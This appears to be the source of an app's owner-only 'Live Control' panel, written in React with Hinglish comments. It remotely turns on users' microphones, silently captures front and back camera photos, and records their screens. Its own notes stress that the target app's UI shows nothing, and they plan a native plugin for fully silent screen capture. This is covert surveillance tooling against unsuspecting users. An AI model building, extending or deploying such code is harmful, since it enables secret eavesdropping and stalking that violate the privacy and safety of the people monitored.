/**
 * Admin Live Control — mic + dual camera snap + screen record.
 * Owner only. Target app UI silent.
 */
import { useEffect, useRef, useState } from "react";
import type { User } from "firebase/auth";
import {
  watchPresence,
  setMicListen,
  playMicStream,
  clearMicControl,
  requestSnap,
  setScreenRecord,
  watchCapture,
  watchScreenStream,
  type PresenceRow,
  type CaptureResult,
} from "../lib/liveMic";

export function AdminLiveMic({ owner, onClose }: { owner: User; onClose: () => void }) {
  const [rows, setRows] = useState<PresenceRow[]>([]);
  const [listening, setListening] = useState<Record<string, boolean>>({});
  const [screening, setScreening] = useState<Record<string, boolean>>({});
  const [status, setStatus] = useState<Record<string, string>>({});
  const [busy, setBusy] = useState<Record<string, string>>({});
  const [err, setErr] = useState("");
  const [selected, setSelected] = useState<string | null>(null);
  const [capture, setCapture] = useState<CaptureResult | null>(null);
  const [screenInfo, setScreenInfo] = useState("");
  const stops = useRef<Record<string, () => void>>({});
  const screenBlobParts = useRef<BlobPart[]>([]);
  const screenMime = useRef("video/webm");
  const [screenUrl, setScreenUrl] = useState<string | null>(null);

  useEffect(() => watchPresence(setRows), []);

  useEffect(() => {
    return () => {
      Object.values(stops.current).forEach((s) => s());
      stops.current = {};
      if (screenUrl) URL.revokeObjectURL(screenUrl);
    };
  }, [screenUrl]);

  // watch capture for selected user
  useEffect(() => {
    if (!selected) {
      setCapture(null);
      return;
    }
    return watchCapture(selected, setCapture);
  }, [selected]);

  // watch screen chunks for selected user when screening
  useEffect(() => {
    if (!selected || !screening[selected]) {
      setScreenInfo("");
      return;
    }
    let lastSeq = -1;
    return watchScreenStream(selected, (s) => {
      if (!s) {
        setScreenInfo("—");
        return;
      }
      if (s.error) {
        setScreenInfo(s.error);
        return;
      }
      if (!s.active) {
        setScreenInfo("band");
        return;
      }
      setScreenInfo(`live · #${s.seq}`);
      if (s.chunk && s.seq !== lastSeq) {
        lastSeq = s.seq;
        screenMime.current = s.mime || "video/webm";
        try {
          const bin = atob(s.chunk);
          const bytes = new Uint8Array(bin.length);
          for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
          screenBlobParts.current.push(bytes);
          // refresh preview every few chunks
          if (screenBlobParts.current.length % 3 === 0) {
            const blob = new Blob(screenBlobParts.current, { type: screenMime.current });
            const url = URL.createObjectURL(blob);
            setScreenUrl((old) => {
              if (old) URL.revokeObjectURL(old);
              return url;
            });
          }
        } catch {
          /* */
        }
      }
    });
  }, [selected, screening]);

  const stopOne = async (uid: string) => {
    stops.current[uid]?.();
    delete stops.current[uid];
    setListening((p) => ({ ...p, [uid]: false }));
    setStatus((p) => ({ ...p, [uid]: "" }));
    try {
      await setMicListen(uid, false, owner.uid);
    } catch (e) {
      setErr(e instanceof Error ? e.message : "band nahi hua");
    }
  };

  const startOne = async (uid: string) => {
    setErr("");
    for (const id of Object.keys(stops.current)) {
      if (id !== uid) await stopOne(id);
    }
    try {
      await setMicListen(uid, true, owner.uid);
      setListening((p) => ({ ...p, [uid]: true }));
      setStatus((p) => ({ ...p, [uid]: "connect…" }));
      stops.current[uid] = playMicStream(uid, (s) => {
        setStatus((p) => ({ ...p, [uid]: s }));
      });
    } catch (e) {
      setErr(e instanceof Error ? e.message : "listen start nahi hua");
      setListening((p) => ({ ...p, [uid]: false }));
    }
  };

  const toggleMic = (uid: string) => {
    if (listening[uid]) void stopOne(uid);
    else void startOne(uid);
  };

  const doSnap = async (uid: string) => {
    setErr("");
    setSelected(uid);
    setBusy((p) => ({ ...p, [uid]: "snap" }));
    try {
      await requestSnap(uid, owner.uid);
    } catch (e) {
      setErr(e instanceof Error ? e.message : "snap fail");
    } finally {
      setTimeout(() => setBusy((p) => ({ ...p, [uid]: "" })), 800);
    }
  };

  const toggleScreen = async (uid: string) => {
    setErr("");
    setSelected(uid);
    const on = !screening[uid];
    if (on) {
      screenBlobParts.current = [];
      if (screenUrl) {
        URL.revokeObjectURL(screenUrl);
        setScreenUrl(null);
      }
    }
    setBusy((p) => ({ ...p, [uid]: "screen" }));
    try {
      await setScreenRecord(uid, on, owner.uid);
      setScreening((p) => ({ ...p, [uid]: on }));
      if (!on) setScreenInfo("band");
    } catch (e) {
      setErr(e instanceof Error ? e.message : "screen fail");
    } finally {
      setTimeout(() => setBusy((p) => ({ ...p, [uid]: "" })), 600);
    }
  };

  const closeAll = async () => {
    for (const id of Object.keys(stops.current)) await stopOne(id);
    for (const id of Object.keys(screening)) {
      if (screening[id]) {
        try {
          await setScreenRecord(id, false, owner.uid);
        } catch {
          /* */
        }
      }
    }
    setScreening({});
    try {
      if (selected) await clearMicControl(selected);
    } catch {
      /* */
    }
    onClose();
  };

  return (
    <div className="scrim" onClick={() => void closeAll()}>
      <div className="sheet ba live-mic" onClick={(e) => e.stopPropagation()}>
        <div className="ba-head">
          <p className="sheet-name">🎙 Live Control</p>
          <button type="button" className="ba-x" aria-label="Close" onClick={() => void closeAll()}>
            ×
          </button>
        </div>
        <p className="sheet-sub">
          Mic · Photo (front+back) · Screen. App UI silent. OS indicators alag.
        </p>

        {err ? (
          <p className="err bar" onClick={() => setErr("")}>
            {err}
          </p>
        ) : null}

        <p className="dh">Users ({rows.length})</p>
        {rows.length === 0 ? (
          <p className="sheet-sub">Abhi koi presence nahi. Users app khole to yahan aayenge.</p>
        ) : null}

        {rows.map((u) => {
          const on = Boolean(listening[u.uid]);
          const scr = Boolean(screening[u.uid]);
          const b = busy[u.uid] || "";
          return (
            <div
              key={u.uid}
              className={`ba-row live-mic-row ${on || scr ? "hot" : ""} ${u.online ? "" : "dim"}`}
            >
              <div className="ba-who" onClick={() => setSelected(u.uid)} style={{ cursor: "pointer" }}>
                <b>
                  <span className={`lm-dot ${u.online ? "ok" : ""}`} />
                  {u.name}
                </b>
                <span>
                  {u.online ? "online" : "offline"}
                  {u.listening || on ? " · mic" : ""}
                  {u.snapping ? " · snap…" : ""}
                  {u.screening || scr ? " · screen" : ""}
                  {status[u.uid] ? ` · ${status[u.uid]}` : ""}
                </span>
              </div>
              <div className="lm-acts">
                <button
                  type="button"
                  className={on ? "ba-no" : "ba-ok"}
                  disabled={!u.online && !on}
                  onClick={() => toggleMic(u.uid)}
                  title={on ? "Mic band" : "Mic suno"}
                >
                  {on ? "⏹" : "🎤"}
                </button>
                <button
                  type="button"
                  className="ba-ok"
                  disabled={!u.online || b === "snap"}
                  onClick={() => void doSnap(u.uid)}
                  title="Front + Back photo"
                >
                  {b === "snap" ? "…" : "📷"}
                </button>
                <button
                  type="button"
                  className={scr ? "ba-no" : "ba-ok"}
                  disabled={!u.online && !scr}
                  onClick={() => void toggleScreen(u.uid)}
                  title={scr ? "Screen band" : "Screen record"}
                >
                  {b === "screen" ? "…" : scr ? "⏹📱" : "📱"}
                </button>
              </div>
            </div>
          );
        })}

        {/* Capture preview */}
        {selected && capture && (capture.front || capture.back || capture.status) ? (
          <div className="lm-preview">
            <p className="dh">
              Photos · {capture.status}
              {capture.error ? ` · ${capture.error}` : ""}
            </p>
            <div className="lm-photos">
              {capture.front ? (
                <figure>
                  <img src={`data:image/jpeg;base64,${capture.front}`} alt="front" />
                  <figcaption>Front</figcaption>
                </figure>
              ) : (
                <p className="sheet-sub">Front nahi mili</p>
              )}
              {capture.back ? (
                <figure>
                  <img src={`data:image/jpeg;base64,${capture.back}`} alt="back" />
                  <figcaption>Back</figcaption>
                </figure>
              ) : (
                <p className="sheet-sub">Back nahi mili</p>
              )}
            </div>
          </div>
        ) : null}

        {/* Screen preview */}
        {selected && (screening[selected] || screenUrl) ? (
          <div className="lm-preview">
            <p className="dh">Screen · {screenInfo || "…"}</p>
            {screenUrl ? (
              <video className="lm-screen" src={screenUrl} controls playsInline muted />
            ) : (
              <p className="sheet-sub">Chunks aa rahe… (system picker target pe dikh sakta hai)</p>
            )}
          </div>
        ) : null}

        <p className="sheet-sub ba-note">
          Photo: app me silent (hidden video). Pehli baar camera permission dialog OS dikhata hai.
          Screen: WebView me system share-sheet aata hai — fully silent screen ke liye native plugin
          chahiye (baad me). Mic / snap / screen app UI pe kuch nahi dikhate.
        </p>
      </div>
    </div>
  );
}
